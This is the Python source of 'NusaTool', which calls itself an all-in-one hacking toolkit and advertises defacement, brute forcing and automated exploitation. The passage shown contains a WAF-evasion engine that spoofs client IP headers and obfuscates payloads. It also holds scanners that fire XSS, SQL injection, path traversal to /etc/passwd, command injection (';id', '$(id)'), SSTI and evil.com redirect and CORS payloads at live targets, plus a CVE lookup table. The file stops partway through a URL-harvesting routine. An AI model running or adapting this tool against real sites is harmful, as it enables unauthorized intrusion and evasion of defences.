#!/usr/bin/env python3
"""
NusaTool v1.2.0 — All-in-One Hacking Toolkit
  • AutoPwn (8-phase auto hack)
  • URL Scanner (XSS, SQLi, LFI, Redirect, CMDi, SSTI)
  • CORS Scanner • CSRF Scanner • CVE Checker
  • WAF Bypass Engine (12+ techniques)
  • JSON/HTML Report Export
"""

import argparse, sys, os, socket, threading, time, datetime, json, hashlib, random, string, base64, subprocess, re
import requests, urllib.parse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import urlparse, parse_qs, urljoin
from queue import Queue
from html import escape

VERSION = "1.2.0"

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
B = "\033[94m"; M = "\033[95m"; C = "\033[96m"
W = "\033[97m"; D = "\033[90m"; N = "\033[0m"
BOLD = "\033[1m"; DIM = "\033[2m"

shutil = __import__('shutil')

def cw():
    return shutil.get_terminal_size().columns if hasattr(shutil, 'get_terminal_size') else 60

def header(t):
    w = cw()
    print(f"\n{BG_BLUE}{BOLD}{W}  {t}  {N}")
    print(f"{DIM}{C}{'─' * w}{N}")

BG_BLUE = "\033[44m"

def ptable(headers, rows, colors=None):
    if not rows: return
    col_w = [max(len(str(h)), max((len(str(r[i])) for r in rows), default=0)) for i, h in enumerate(headers)]
    sep = " │ "
    print(f"\n{BOLD}{C}{sep.join(f'{h:<{col_w[i]}}' for i, h in enumerate(headers))}{N}")
    print(f"{D}{C}{'─' * (sum(col_w) + len(sep) * (len(headers) - 1))}{N}")
    for ri, row in enumerate(rows):
        c = colors[ri] if colors and ri < len(colors) else W
        print(f"{c}{sep.join(f'{str(row[i]):<{col_w[i]}}' for i in range(len(row)))}{N}")

BANNER = f"""{R}
  ███╗   ██╗██╗   ██╗███████╗ █████╗ ████████╗ ██████╗  ██████╗ ██╗
  ████╗  ██║██║   ██║██╔════╝██╔══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║
  ██╔██╗ ██║██║   ██║███████╗███████║   ██║   ██║   ██║██║   ██║██║
  ██║╚██╗██║██║   ██║╚════██║██╔══██║   ██║   ██║   ██║██║   ██║██║
  ██║ ╚████║╚██████╔╝███████║██║  ██║   ██║   ╚██████╔╝╚██████╔╝███████╗
  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
{N}{D}  ════════════════════════════════════════════════════════════════════{N}
  {C}ALL-IN-ONE HACKING TOOLKIT{N}{D}   v{VERSION}{N}{D}   [{G}DEFACE{N}{D}][{Y}AUTOPWN{N}{D}][{M}BRUTE{N}{D}][{R}EXPLOIT{N}{D}][{C}CRACK{N}{D}]{N}
{C}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{N}
"""


# ══════════════════════════════════════════════════════
#  BYPASS ENGINE (Enhanced)
# ══════════════════════════════════════════════════════

class BypassEngine:
    def __init__(self, target_url):
        self.url = target_url; self.waf_detected = False; self.waf_name = None
        self.connected = False; self.connect_error = None; self.status_code = None
        self.bypass_headers = {}; self.ua_list = []; self._detect_waf(); self._build_headers()

    def check_connection(self):
        """Test connectivity and return True if reachable."""
        if self.connected:
            return True
        try:
            r = requests.get(self.url, timeout=10, verify=False)
            self.status_code = r.status_code
            self.connected = True
            return True
        except requests.ConnectionError as e:
            self.connect_error = f"Connection failed: {e}"
            return False
        except requests.Timeout:
            self.connect_error = "Connection timeout (10s)"
            return False
        except Exception as e:
            self.connect_error = f"{e}"
            return False

    def _detect_waf(self):
        try:
            r = requests.get(self.url, timeout=10, verify=False)
            self.connected = True
            self.status_code = r.status_code
            self.waf_raw = r.text
            sigs = {
                "Cloudflare": ["cloudflare", "__cfduid", "cf-ray"],
                "ModSecurity": ["mod_security", "modsecurity", "405 not allowed"],
                "AWS WAF": ["awswaf", "x-amzn-", "aws"],
                "Akamai": ["akamai", "akamaighost"],
                "Imperva": ["incapsula", "imperva"],
                "Sucuri": ["sucuri", "cloudproxy"],
                "Barracuda": ["barracuda"],
                "F5 BIG-IP": ["bigip", "f5"],
                "Fortinet": ["fortigate", "fortiwaf", "fortiweb"],
                "Wordfence": ["wordfence"],
                "Comodo WAF": ["comodo"],
                "Radware": ["radware", "appwall"],
                "Citrix Netscaler": ["netscaler", "citrix"],
                "DenyALL": ["denyall", "rbl"],
                "Safe3 WAF": ["safe3", "safe3waf"],
                "NAXSI": ["naxsi", "blocked by naxsi"],
                "WebKnight": ["webknight", "webknight"],
                "Airlock": ["airlock"],
                "Yundun": ["yundun"],
                "Safedog": ["safedog", "safedogwaf"],
                "DDoS-Guard": ["ddos-guard"],
                "Varnish": ["varnish"],
            }
            for name, sigs_list in sigs.items():
                for sig in sigs_list:
                    if sig in r.text.lower() or any(sig in str(h).lower() for h in r.headers):
                        self.waf_detected = True; self.waf_name = name; return
            if r.status_code in (403, 406, 501, 503):
                blocked_words = ["blocked", "denied", "forbidden", "rejected", "unauthorized", "waf"]
                if any(b in r.text.lower() for b in blocked_words):
                    self.waf_detected = True; self.waf_name = "Generic WAF / Blocking"; return
        except requests.ConnectionError as e:
            self.connect_error = f"Connection failed: {e}"
        except requests.Timeout:
            self.connect_error = "Connection timeout (10s)"
        except Exception as e:
            self.connect_error = f"{e}"

    def _build_headers(self):
        self.ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "curl/8.4.0", "Wget/1.21.4", "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.6099.230 Mobile Safari/537.36",
        ]
        self.bypass_headers = {
            "X-Forwarded-For": self._rand_ip(), "X-Real-IP": self._rand_ip(),
            "X-Originating-IP": self._rand_ip(), "X-Remote-IP": self._rand_ip(),
            "X-Remote-Addr": self._rand_ip(), "X-Client-IP": self._rand_ip(),
            "X-Forwarded-Proto": "https", "X-Forwarded-Scheme": "https",
            "X-Forwarded-Host": urlparse(self.url).netloc if self.url else "localhost",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",             "Accept-Encoding": "gzip, deflate",
            "Cache-Control": "no-cache, no-store", "Pragma": "no-cache",
            "Upgrade-Insecure-Requests": "1",
        }

    def _rand_ip(self):
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

    def encode(self, payload, technique="auto"):
        techs = {
            "url": urllib.parse.quote(payload),
            "double_url": urllib.parse.quote(urllib.parse.quote(payload)),
            "unicode": "".join(f"\\u{ord(c):04x}" for c in payload),
            "hex": "0x" + payload.encode().hex(),
            "base64": base64.b64encode(payload.encode()).decode(),
            "mixed": "".join(c.upper() if random.randint(0,1) else c.lower() for c in payload),
            "comment": self._comment(payload), "tab": payload.replace(" ", "\t"),
            "newline": payload.replace(" ", "\\n"), "nullbyte": payload.replace(" ", "\\x00"),
            "utf16": payload.encode("utf-16").hex(),
            "html": "".join(f"&#{ord(c)};" if c in "<>\"'" else c for c in payload),
            "reverse": payload[::-1],
        }
        if technique == "auto":
            t = random.choice(list(techs.keys())); return techs[t], t
        return techs.get(technique, payload), technique

    def _comment(self, payload):
        if "'" in payload:
            return "'/*" + ''.join(random.choices(string.ascii_letters, k=3)) + "*/".join(payload.split("'")[1:])
        if " " in payload: return payload.replace(" ", "/**/")
        return payload

    def get(self, url, **kwargs):
        hdrs = {**self.bypass_headers, "User-Agent": random.choice(self.ua_list), **kwargs.pop("headers", {})}
        if self.waf_detected: hdrs["X-Forwarded-For"] = self._rand_ip()
        return requests.get(url, headers=hdrs, verify=False, **kwargs)

    def post(self, url, **kwargs):
        hdrs = {**self.bypass_headers, "User-Agent": random.choice(self.ua_list), **kwargs.pop("headers", {})}
        return requests.post(url, headers=hdrs, verify=False, **kwargs)

    def info(self):
        if self.connect_error:
            return f"  {R}✘ {self.connect_error}{N}"
        if self.waf_detected:
            return f"  {Y}⚠ WAF: {BOLD}{self.waf_name}{N}{D}  bypass active ({len(self.bypass_headers)} headers){N}"
        status = f"  {G}✔ Reachable{N}{D}  [HTTP {self.status_code}]{N}" if self.connected else ""
        waf = f"  {G}✔ No WAF detected{N}"
        return f"{status}\n{waf}"


# ══════════════════════════════════════════════════════
#  CORS SCANNER
# ══════════════════════════════════════════════════════

class CORSScanner:
    def __init__(self, url, bypass=None):
        self.url = url.rstrip("/"); self.bypass = bypass or BypassEngine(url); self.vulns = []

    def scan(self):
        header("CORS EXPLOIT CHECK")
        print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable — aborting.\n")
            return []
        origins = [
            "https://evil.com", "null", "http://evil.com",
            "https://evil.com.evil.com", "https://evil.com/",
            "http://localhost", "https://evil.com%40", "http://127.0.0.1",
            "https://evil.com@", "https://evil.com#",
        ]
        print(f"  {C}◉{N} Testing {len(origins)} origins...\n")
        errors = 0
        for origin in origins:
            try:
                r = self.bypass.get(self.url, headers={"Origin": origin, "Referer": origin}, timeout=10)
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")
                if acao == "*":
                    self.vulns.append({"origin": origin, "issue": "Wildcard ACAO (*)", "acao": acao, "acac": acac})
                    print(f"  {R}[!] CRITICAL{N} Wildcard CORS: {Y}{origin}{N}  {D}→ ACAO: *{N}")
                elif acao == origin or (acao and origin in acao):
                    risk = f"Reflect: {acao}"
                    if acac.lower() == "true":
                        risk += " + Credentials!"
                        self.vulns.append({"origin": origin, "issue": "Reflected ACAO + Credentials", "acao": acao, "acac": acac})
                        print(f"  {R}[!] HIGH{N} {Y}{origin}{N}  {D}→ ACAO: {acao} | Credentials: {acac}{N}")
                    else:
                        self.vulns.append({"origin": origin, "issue": "Reflected ACAO", "acao": acao, "acac": acac})
                        print(f"  {Y}[!] MEDIUM{N} {Y}{origin}{N}  {D}→ ACAO: {acao}{N}")
                elif acao:
                    print(f"  {D}[?] CORS: {Y}{origin}{N} → ACAO: {acao}{N}")
            except requests.RequestException as e:
                errors += 1
                if errors == 1:
                    print(f"  {R}⚠{N} Request failed: {e}")
        if errors > 1:
            print(f"  {R}⚠{N} ...and {errors-1} more request(s) failed")

        if not self.vulns:
            print(f"\n  {G}✔{N} No CORS misconfigurations detected.")
        else:
            print(f"\n  {R}{BOLD}⚠ {len(self.vulns)} CORS issue(s) found!{N}")
            ptable(["#", "ORIGIN", "ISSUE"],
                   [[str(i+1), v["origin"][:35], v["issue"]] for i, v in enumerate(self.vulns)],
                   colors=[R]*len(self.vulns))
        print(); return self.vulns


# ══════════════════════════════════════════════════════
#  CSRF SCANNER
# ══════════════════════════════════════════════════════

class CSRFScanner:
    def __init__(self, url, bypass=None):
        self.url = url.rstrip("/"); self.bypass = bypass or BypassEngine(url); self.vulns = []
        self.csrf_keywords = ["csrf", "token", "nonce", "_token", "authenticity_token",
                              "xsrf", "csrf_token", "csrfmiddlewaretoken", "__csrf"]

    def scan(self):
        header("CSRF TOKEN BYPASS CHECK")
        print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable — aborting.\n")
            return []

        try:
            r = self.bypass.get(self.url, timeout=10)
            forms = []; i = 0
            while True:
                fs = r.text.find("<form", i)
                if fs == -1: break
                fe = r.text.find("</form>", fs)
                if fe == -1: break
                forms.append(r.text[fs:fe+7]); i = fe + 7

            if not forms:
                print(f"  {Y}⚠{N} No forms found on page.\n"); return []

            print(f"  {C}◉{N} Found {len(forms)} form(s)\n")

            for fi, form in enumerate(forms):
                method = "GET"
                if 'method=' in form[:200]:
                    ms = form[:200].lower().find('method=')
                    me = form[:200].find('"', ms+8) if form[:200].find('"', ms+8) > ms else form[:200].find("'", ms+8)
                    if me > ms: method = form[:200][ms+7:me].upper()

                inputs = []
                j = 0
                while True:
                    is_ = form.find("<input", j)
                    if is_ == -1: break
                    ie = form.find(">", is_)
                    if ie == -1: break
                    inp = form[is_:ie+1]
                    name, itype = "", ""
                    import re
                    nm = re.search(r'name=["\']([^"\']+)["\']', inp)
                    ty = re.search(r'type=["\']([^"\']+)["\']', inp)
                    if nm: name = nm.group(1)
                    if ty: itype = ty.group(1)
                    inputs.append({"name": name, "type": itype, "html": inp})
                    j = ie + 1

                has_csrf = any(
                    any(kw in inp["name"].lower() for kw in self.csrf_keywords)
                    for inp in inputs if inp["name"]
                )
                has_hidden = any(inp["type"] == "hidden" for inp in inputs)

                action = ""
                am = re.search(r'action=["\']([^"\']+)["\']', form[:300])
                if am: action = am.group(1)

                if not has_csrf and method == "POST":
                    self.vulns.append({"form": fi+1, "method": method, "action": action, "issue": "No CSRF token"})
                    print(f"  {R}[!] VULN #{fi+1}{N} Method: {Y}{method}{N}  Action: {D}{action[:40]}{N}")
                    print(f"      {R}→ No CSRF protection token found!{N}")
                    for inp in inputs:
                        if inp["name"]:
                            print(f"      {D}param: {inp['name']}{N}")
                elif has_csrf:
                    print(f"  {G}[✔] Form #{fi+1}{N} CSRF protected  {D}[token found]{N}")
                elif method == "GET":
                    print(f"  {D}[−] Form #{fi+1}{N} GET method  {D}(CSRF not applicable){N}")
        except requests.RequestException as e:
            print(f"  {R}✘{N} CSRF scan error: {e}")
        except Exception as e:
            print(f"  {R}✘{N} CSRF scan error: {e}")

        if self.vulns:
            print(f"\n  {R}{BOLD}⚠ {len(self.vulns)} CSRF vulnerable form(s)!{N}")
        else:
            print(f"\n  {G}✔{N} No CSRF issues detected (or forms are protected).")
        print(); return self.vulns


# ══════════════════════════════════════════════════════
#  CVE CHECKER
# ══════════════════════════════════════════════════════

class CVEChecker:
    def __init__(self):
        self.cve_db = {
            "apache httpd": {"2.4.49": ["CVE-2021-41773 (Path Traversal)", "HIGH"],
                             "2.4.50": ["CVE-2021-42013 (Path Traversal)", "HIGH"],
                             "2.4.52": ["CVE-2022-26377 (HTTP Request Smuggling)", "MEDIUM"],
                             "2.4.6": ["CVE-2014-0098 (NULL Pointer Dereference)", "MEDIUM"],
                             "2.2.34": ["CVE-2017-9798 (Optionsbleed)", "HIGH"]},
            "nginx": {"1.20.0": ["CVE-2021-23017 (DNS Resolver)", "HIGH"],
                      "1.18.0": ["CVE-2021-23017 (DNS Resolver)", "HIGH"],
                      "1.14.0": ["CVE-2019-9516 (HTTP/2 0-Length)", "MEDIUM"],
                      "1.13.0": ["CVE-2019-20372 (Directory Traversal)", "MEDIUM"],
                      "1.4.0": ["CVE-2017-7529 (Integer Overflow)", "HIGH"]},
            "openssh": {"8.0": ["CVE-2019-16905 (Integer Overflow)", "HIGH"],
                        "7.9": ["CVE-2019-25031 (Vulnerability)", "MEDIUM"],
                        "7.7": ["CVE-2018-20685 (User Enum)", "LOW"],
                        "7.2": ["CVE-2016-6210 (User Enum)", "LOW"],
                        "6.8": ["CVE-2018-15473 (User Enum)", "LOW"],
                        "5.9": ["CVE-2015-5600 (MaxAuthTries)", "MEDIUM"]},
            "mysql": {"5.7.35": ["CVE-2021-35604 (DoS)", "MEDIUM"],
                      "5.6.51": ["CVE-2020-14878 (DDoS)", "HIGH"],
                      "5.5.62": ["CVE-2020-25722 (Vulnerability)", "MEDIUM"],
                      "8.0.27": ["CVE-2022-21263 (Privilege Escalation)", "HIGH"]},
            "php": {"5.6.40": ["CVE-2019-11043 (Remote Code Execution)", "CRITICAL"],
                    "7.0.33": ["CVE-2019-11043 (Remote Code Execution)", "CRITICAL"],
                    "7.1.33": ["CVE-2019-11043 (Remote Code Execution)", "CRITICAL"],
                    "7.2.34": ["CVE-2021-21703 (Privilege Escalation)", "HIGH"],
                    "7.3.31": ["CVE-2021-21703 (Privilege Escalation)", "HIGH"],
                    "7.4.24": ["CVE-2021-21703 (Privilege Escalation)", "HIGH"],
                    "8.0.11": ["CVE-2021-21703 (Privilege Escalation)", "HIGH"]},
            "proftpd": {"1.3.5": ["CVE-2015-3306 (File Copy RCE)", "CRITICAL"],
                        "1.3.6": ["CVE-2020-9272 (RCE)", "CRITICAL"]},
            "openssl": {"1.0.1": ["CVE-2014-0160 (Heartbleed)", "CRITICAL"],
                        "1.0.2": ["CVE-2016-2107 (Padding Oracle)", "MEDIUM"]},
            "vsftpd": {"2.3.4": ["CVE-2011-2523 (Backdoor RCE)", "CRITICAL"]},
            "tomcat": {"8.5.0": ["CVE-2017-12617 (RCE)", "CRITICAL"],
                       "9.0.0": ["CVE-2019-0232 (RCE)", "CRITICAL"],
                       "7.0.0": ["CVE-2017-12615 (PUT RCE)", "CRITICAL"]},
            "wordpress": {"4.7.0": ["CVE-2017-1001000 (REST API)", "HIGH"],
                          "4.7.1": ["CVE-2017-1001000 (REST API)", "HIGH"],
                          "5.0.0": ["CVE-2019-8942 (RCE)", "CRITICAL"],
                          "5.0.1": ["CVE-2019-8942 (RCE)", "CRITICAL"],
                          "5.1.0": ["CVE-2019-9787 (XSS)", "MEDIUM"]},
            "drupal": {"7.0": ["CVE-2014-3704 (Drupalgeddon SQLi)", "CRITICAL"],
                       "8.0": ["CVE-2018-7600 (Drupalgeddon2 RCE)", "CRITICAL"]},
            "joomla": {"3.0.0": ["CVE-2015-8623 (SQLi)", "HIGH"],
                       "3.4.0": ["CVE-2015-7297 (RCE)", "CRITICAL"]},
            "elasticsearch": {"1.4.0": ["CVE-2015-1427 (RCE)", "CRITICAL"],
                              "1.5.0": ["CVE-2015-1427 (RCE)", "CRITICAL"]},
            "mongodb": {"2.6.0": ["CVE-2017-17585 (DoS)", "MEDIUM"]},
            "redis": {"2.8.0": ["CVE-2015-4335 (Lua Sandbox)", "HIGH"],
                      "3.2.0": ["CVE-2016-8339 (Protocol)", "MEDIUM"]},
            "jenkins": {"2.0.0": ["CVE-2017-1000353 (RCE)", "CRITICAL"],
                        "2.50.0": ["CVE-2018-1000861 (RCE)", "CRITICAL"]},
            "gitlab": {"8.0.0": ["CVE-2016-4340 (RCE)", "CRITICAL"],
                       "10.0.0": ["CVE-2018-19571 (SSRF)", "HIGH"]},
            "docker": {"18.06.0": ["CVE-2019-13139 (RCE)", "HIGH"],
                       "19.03.0": ["CVE-2020-13401 (RCE)", "HIGH"]},
            "kubernetes": {"1.13.0": ["CVE-2019-1002100 (Priv Esc)", "HIGH"],
                           "1.16.0": ["CVE-2020-8554 (MITM)", "MEDIUM"]},
        }

    def check(self, service, version):
        service = service.lower()
        results = []
        for sname, versions in self.cve_db.items():
            if sname in service:
                for ver, cve in versions.items():
                    if version.startswith(ver[:3]):
                        results.append({"cve": cve[0], "severity": cve[1], "service": sname, "version": version})
        return results

    def scan_from_banners(self, banners):
        header("CVE EXPLOIT CHECK — VULNERABILITY DATABASE")
        print(f"  {C}◉{N} Checking {len(banners)} service(s) against CVE database...\n")
        all_results = []
        for b in banners:
            svc = b.get("service", "").lower()
            ban = (b.get("banner") or "").lower()
            version = ""
            import re
            vm = re.search(r'[\d]+\.[\d]+(?:\.[\d]+)?', ban or "")
            if vm: version = vm.group()
            if not version: continue
            results = self.check(svc, version)
            for r in results:
                all_results.append(r)
                sev_color = {"CRITICAL": R+BOLD, "HIGH": R, "MEDIUM": Y, "LOW": G}.get(r["severity"], W)
                print(f"  {sev_color}[!]{N} {Y}{r['service']}{N} {D}v{version}{N}")
                print(f"      {sev_color}{r['cve']}{N}  {D}[{r['severity']}]{N}")

        if not all_results:
            print(f"  {G}✔{N} No known CVEs matched (or version unknown).")
        else:
            print(f"\n  {R}{BOLD}⚠ {len(all_results)} potential CVE(s) found!{N}")
            ptable(["#", "SERVICE", "CVE", "SEVERITY"],
                   [[str(i+1), r["service"], r["cve"][:45], r["severity"]] for i, r in enumerate(all_results)],
                   colors=[R if r["severity"] in ("CRITICAL","HIGH") else Y for r in all_results])
        print(); return all_results


# ══════════════════════════════════════════════════════
#  URL VULNERABILITY SCANNER (6-in-1)
# ══════════════════════════════════════════════════════

class URLScanner:
    def __init__(self, url, bypass=None):
        self.url = url; self.bypass = bypass or BypassEngine(url)
        self.vulns = []; self.parsed = urlparse(url)
        self.params = list(parse_qs(self.parsed.query).keys()) if parse_qs(self.parsed.query) else []
        self.errors = []

    def _req(self, u, method="GET", data=None):
        try:
            return self.bypass.get(u, timeout=10, allow_redirects=False) if method == "GET" else self.bypass.post(u, data=data, timeout=10, allow_redirects=False)
        except requests.ConnectionError as e:
            self.errors.append(f"Connection error: {u[:60]}... ({e})")
            return None
        except requests.Timeout:
            self.errors.append(f"Timeout: {u[:60]}...")
            return None
        except Exception as e:
            self.errors.append(f"Request failed: {u[:60]}... ({e})")
            return None

    def _test_xss(self, param, payload):
        new = urllib.parse.urlencode({k: (payload if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
        u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
        r = self._req(u)
        if r and payload.lower() in r.text.lower(): return ("XSS", payload, u)
        for enc, ename in [(urllib.parse.quote(payload), "url"), (payload.upper(), "upper")]:
            new2 = urllib.parse.urlencode({k: (enc if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
            u2 = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new2}"
            r2 = self._req(u2)
            if r2 and (payload.lower() in r2.text.lower() or payload.upper() in r2.text.upper()):
                return (f"XSS ({ename} bypass)", payload, u2)
        return None

    def _test_sqli(self, param, payload):
        new = urllib.parse.urlencode({k: (payload if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
        u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"; r = self._req(u)
        if not r: return None
        for p in ["sql", "syntax error", "mysql", "odbc", "oracle", "postgresql", "sqlite", "unclosed quotation", "warning: mysql", "invalid query", "ora-"]:
            if p in r.text.lower(): return ("SQLi", payload, u, f"Error: {p}")
        if r.status_code in (500, 404, 403): return ("SQLi", payload, u, f"HTTP {r.status_code}")
        return None

    def _test_lfi(self, param):
        for pay in ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/etc/passwd",
                     "....//....//....//etc/passwd", "../../../etc/passwd%00",
                     "php://filter/convert.base64-encode/resource=index"]:
            new = urllib.parse.urlencode({k: (pay if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"; r = self._req(u)
            if not r: continue
            if "root:x:" in r.text or "[extensions]" in r.text or "boot loader" in r.text.lower(): return ("LFI", pay, u)
            if "PD9waHA" in r.text or "base64" in r.text[:200]: return ("LFI (PHP filter)", pay, u)
        return None

    def _test_open_redirect(self, param):
        for pay in ["//evil.com", "https://evil.com/"]:
            new = urllib.parse.urlencode({k: (pay if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"; r = self._req(u)
            if not r: continue
            if r.status_code in (301, 302, 307, 308) and "evil" in r.headers.get("Location", ""): return ("Open Redirect", pay, u)
        return None

    def _test_cmdi(self, param):
        for pay in [";id", "|id", "`id`", "$(id)"]:
            new = urllib.parse.urlencode({k: (pay if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"; r = self._req(u)
            if r and ("uid=" in r.text or "gid=" in r.text): return ("Command Injection", pay, u)
        return None

    def _test_ssti(self, param):
        for pay in ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]:
            new = urllib.parse.urlencode({k: (pay if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"; r = self._req(u)
            if r and "49" in r.text and pay == "{{7*7}}": return ("SSTI (Jinja2/Twig)", pay, u)
        return None

    def scan(self):
        header("URL EXPLOIT SCANNER  [6-in-1]")
        print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable — aborting scan.\n")
            return []
        if not self.params:
            print(f"  {Y}⚠{N} No URL parameters in query string. Use ParamSpider first to find parameters.\n")
            return []
        print(f"  {C}◉{N} Params: {len(self.params)} | Scans: {Y}XSS, SQLi, LFI, Redirect, CMDi, SSTI{N}\n")

        checks = [("XSS", self._test_xss, ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>", "';alert(1);//", "<svg onload=alert(1)>"]),
            ("SQLi", self._test_sqli, ["'", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1", "' UNION SELECT 1,2,3--"]),
            ("LFI", self._test_lfi, [""]), ("Open Redirect", self._test_open_redirect, [""]),
            ("Cmd Inj", self._test_cmdi, [""]), ("SSTI", self._test_ssti, [""])]

        total = sum(len(c[2]) for c in checks) * len(self.params); done = 0
        for vname, func, payloads in checks:
            for param in self.params:
                for payload in payloads:
                    done += 1
                    print(f"  {D}[{done}/{total}] {vname} → {param}...{N}", end="\r")
                    try:
                        result = func(param, payload) if payload else func(param)
                        if result:
                            typ, pay, u = result[0], result[1], result[2]
                            extra = f" | {result[3]}" if len(result) > 3 else ""
                            self.vulns.append({"type": typ, "param": param, "payload": pay, "url": u, "extra": extra})
                            print(f"\n  {R}{BOLD}[!] {typ}{N}  {Y}{param}{N}{D}{extra}{N}")
                            print(f"      {D}payload: {pay[:60]}{N}")
                    except Exception as e:
                        self.errors.append(f"{vname} crash: {e}")
        if self.errors and len(self.errors) < 10:
            for e in self.errors:
                print(f"  {R}⚠{N} {e}")
        if self.vulns:
            print(f"\n  {R}{BOLD}⚠ {len(self.vulns)} vulnerabilities!{N}")
            ptable(["#", "TYPE", "PARAM", "PAYLOAD"],
                   [[str(i+1), v["type"], v["param"], v["payload"][:35]] for i, v in enumerate(self.vulns)],
                   colors=[R]*len(self.vulns))
        else: print(f"\n\n  {G}✔{N} No vulnerabilities detected.")
        if self.errors and len(self.errors) >= 10:
            print(f"  {D}({len(self.errors)} errors suppressed){N}")
        print(); return self.vulns


# ══════════════════════════════════════════════════════
#  PARAMSPIDER — URL & Parameter Discovery
# ══════════════════════════════════════════════════════

class ParamSpider:
    def __init__(self, domain, subs=False, threads=10):
        self.domain = domain.lower().replace("http://","").replace("https://","").split("/")[0]
        self.include_subs = subs
        self.threads = threads
        self.urls = set()
        self.params = {}
        self.all_urls = []

    def _fetch_wayback(self, domain):
        """Fetch URLs from Wayback Machine CDX API."""
        urls = set()
        try:
            filters = "&filter=statuscode:200&filter=statuscode:301&filter=statuscode:302"
            url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original,timestamp{filters}&limit=10000"
            r = requests.get(url, timeout=30, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200:
                data = r.json()
                for entry in data[1:]:  # skip header
                    if len(entry) >= 1:
                        u = entry[0]
                        if self.include_subs or self.domain in u:
                            urls.add(u)
        except: pass
        return urls

    def _fetch_commoncrawl(self, domain):
        """Fetch URLs from CommonCrawl index."""
        urls = set()
        try:
            url = f"http://index.commoncrawl.org/CC-MAIN-2024-10-index?url={domain}/*&output=json&limit=5000"
            r = requests.get(url, timeout=30, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200:
                for line in r.text.strip().split("\n"):
                    try:
                        entry = json.loads(line)
                        u = entry.get("url", "")
                        if u and (self.include_subs or self.domain in u):
                            urls.add(u)
                    except: continue
        except: pass
        return urls

    def _extract_params(self, url):
        """Extract parameters from a URL."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        path = parsed.path
        for key in params:
            if key not in self.params:
                self.params[key] = set()
            self.params[key].add(url)

    def _filter_urls(self, urls):
        """Clean and deduplicate URLs."""
        clean = set()
        extensions = [".jpg", ".jpeg", ".png", ".gif", ".svg", ".css", ".js",
                      ".woff", ".woff2", ".ttf", ".eot", ".ico", ".mp4", ".mp3",
                      ".pdf", ".zip", ".tar", ".gz", ".exe", ".bin"]
        for u in urls:
            u = u.split("#")[0]  # remove fragments
            if not u or not u.startswith("http"):
                continue
            parsed = urlparse(u)
            if any(parsed.path.lower().endswith(ext) for ext in extensions):
                continue
            if parsed.query:  # only URLs with parameters
                clean.add(u)
        return clean

    def run(self):
        header("PARAMSPIDER — URL & PARAMETER DISCOVERY")
        print(f"  {C}◉{N} Domain  : {BOLD}{Y}{self.domain}{N}")
        print(f"  {C}◉{N} Sources : {B}Wayback Machine{N}, {B}CommonCrawl{N}")
        print(f"  {C}◉{N} Subs    : {'Yes' if self.include_subs else 'No (root only)'}{N}\n")

        # Fetch
        print(f"  {C}▶{N} Fetching URLs from Wayback Machine...")
        wb = self._fetch_wayback(self.domain)
        print(f"  {G}✔{N} Got {len(wb)} URLs from Wayback{N}")

        print(f"  {C}▶{N} Fetching URLs from CommonCrawl...")
        cc = self._fetch_commoncrawl(self.domain)
